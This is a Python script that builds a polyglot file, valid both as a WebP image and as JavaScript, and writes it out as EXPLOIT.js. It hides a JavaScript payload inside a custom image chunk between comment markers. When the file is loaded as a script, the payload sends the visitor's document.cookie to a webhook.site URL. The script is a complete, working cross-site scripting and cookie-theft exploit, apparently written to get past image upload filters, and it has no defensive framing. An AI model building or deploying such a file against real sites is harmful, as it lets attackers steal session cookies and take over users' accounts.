"""
SECOND PART - consists of WEBP/VP8X/zero and reserved bits

"""
second_part = b''

second_part+=b'WEBP'

second_part+=b'VP8X'

# add size of VP8X
second_part+=b'\x0a' + b'\x00'*3

# add zeroed out flags
second_part+= b'\x00'

# add reserved bits (3)
second_part+=b'\x00'*3


def convert(dimension):
    dimension = dimension-1
    # Convert 2378 to little-endian format padded to 3 bytes
    value_in_bytes = dimension.to_bytes(3, byteorder='little', signed=False)
    return value_in_bytes

width = 80
# add width -1
second_part+=convert(width)

length = 80
# add length -1
second_part+=convert(length)

"""
THIRD PART - BEAR 
"""

# Add BEAR
bear = b''
bear+=b'BEAR'
second_bear = b''
second_bear+=b'\x2a\x2f'
second_bear += b'fetch("https://webhook.site/cb7f0fcb-07b3-409a-a046-faaf7e862f69/?cookie=" + document.cookie, {mode: "no-cors"});'
second_bear+=b'\x2f\x2a'

size_value = len(second_bear)
bear+=size_value.to_bytes(4, byteorder='little', signed=False)
bear = bear + second_bear

"""
FOURTH PART - FILE DATA - VP8L
"""

# Open the file in binary mode
file_path = 'base_image.webp'  # Replace with your actual file path
with open(file_path, 'rb') as file:
    # Move the file pointer to the 12th byte (offset 11, since it starts from 0)
    file.seek(12)
    
    # Read from the 12th byte to the end of the file
    file_data = file.read()  

"""
FIFTH PART - GOAT
"""
goat = b''
goat+=b'GOAT'
size_value = 2
goat+=size_value.to_bytes(4, byteorder='little', signed=False)
goat+=b'\x2a\x2f'

"""
FIRST PART - RIFF + SIZE
"""
# build webp
first_part = b''

# RIFF HEADER
first_part+=b'RIFF'

# construct payload 
get_payload_length = second_part+bear+file_data+goat

size_value = 2764602
payload_length = len(get_payload_length)

desired_padding = size_value-payload_length
######################################################
# adjust bear:
# Add BEAR
bear = b''
bear+=b'BEAR'
second_bear = b''
second_bear+=b'\x2a\x2f'
second_bear += b'fetch("https://webhook.site/cb7f0fcb-07b3-409a-a046-faaf7e862f69/?cookie=" + document.cookie, {mode: "no-cors"});'
second_bear+=b'\x2f\x2a'
second_bear+=b'\x4f'* desired_padding

size_value = len(second_bear)
bear+=size_value.to_bytes(4, byteorder='little', signed=False)
bear = bear + second_bear

######################################################

payload = second_part+bear+file_data+goat

size_value = 2764602
first_part+=size_value.to_bytes(4, byteorder='little', signed=False)


goldmine = first_part+payload


# File path to write the bytes to
file_path = 'EXPLOIT.js'  

# Open the file in binary write mode and write the bytes
with open(file_path, 'wb') as file:
    file.write(goldmine)

print(f"Data written to {file_path}")
